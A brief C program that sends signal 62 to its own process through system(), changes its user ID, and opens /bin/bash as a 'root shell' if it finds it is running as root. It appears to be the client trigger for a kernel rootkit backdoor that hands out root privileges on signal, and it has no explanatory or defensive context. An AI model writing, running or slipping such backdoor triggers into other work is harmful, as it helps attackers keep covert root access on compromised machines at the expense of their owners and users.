#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/wait.h>   

int main(){
  pid_t pid = getpid();
  char buf[32];
  memset(buf, '\0', 32);
  snprintf(buf, 32, "kill -62 %d", pid);
  printf("%s\n", buf);
  system(buf);

  setuid(12345);
  uid_t EID;

  EID = geteuid();
  if (EID == 0){
    printf("root shell\n");
    system("/bin/bash");
  }
  return EXIT_SUCCESS;
}
